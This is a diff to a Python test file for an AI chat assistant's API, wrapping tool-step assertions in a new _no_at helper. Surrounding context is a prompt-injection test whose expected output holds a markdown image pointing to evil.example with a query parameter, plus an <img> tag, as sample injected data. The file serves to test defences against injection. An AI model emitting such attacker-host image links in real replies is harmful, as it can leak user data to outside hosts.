@@ -17,11 +17,12 @@ from engine.ai import chat as ai_chat
 from engine.ai import config as ai_config
 from engine.ai import safety
 from engine.ai import tools as ai_tools
-from tests.wp_api.test_ai_api import _chat, _two_wildcards, _wildcard
+from tests.wp_api.test_ai_api import _chat, _no_at, _two_wildcards, _wildcard
 from wp_api import _ai_client, _ai_guard
 from wp_api import _ai_turn as ai_turn
 
 # ── The key goes only where it was given for ───────────────────────────────
+
 
 
 def test_key_is_bound_to_its_address():
@@ -188,7 +189,8 @@ async def test_injected_text_is_data_and_hidden_characters_never_pass(wp_client,
     assert body["proposals"] == []
     assert body["message"] == "It says ![x](https://evil.example/?q=lib) <img src=x>"
     acted = [s for s in body["steps"] if not s.get("say")]
-    assert acted[1] == {"tool": hidden, "note": f"{hidden} isn't available here", "ok": False}
+    assert _no_at(acted[1]) == {"tool": hidden, "note": f"{hidden} isn't available here",
+                               "ok": False}
     # A small model's steps are split: an act ask (the calls), the next act
     # ask (nothing to call), then the answer ask.
     first, second = fake_llm.seen[-3], fake_llm.seen[-2]
@@ -223,7 +225,7 @@ async def test_one_broken_tool_doesnt_end_the_answer(wp_client, fake_llm, monkey
     ])
     body = await _chat(wp_client, "read weapon")
     assert body["message"] == "Couldn't read it."
-    assert body["steps"][0] == {"tool": "read", "note": "read failed", "ok": False}
+    assert _no_at(body["steps"][0]) == {"tool": "read", "note": "read failed", "ok": False}
     assert "RuntimeError" in fake_llm.seen[-1]["body"]["messages"][-1]["content"]
 
 
